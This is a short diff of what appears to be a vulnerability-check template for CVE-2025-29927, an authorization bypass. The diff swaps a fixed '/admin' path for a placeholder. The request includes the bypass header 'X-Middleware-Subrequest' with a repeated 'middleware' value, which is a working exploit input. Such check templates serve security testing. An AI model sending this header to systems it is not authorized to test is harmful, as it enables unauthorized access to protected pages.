@@ -8,7 +8,7 @@ cve: CVE-2025-29927
 cwe: CWE-285
 request:
   method: GET
-  path: /admin
+  path: "{{discovered_protected_path}}"
   headers:
     X-Middleware-Subrequest: "middleware:middleware:middleware:middleware:middleware"
 control:
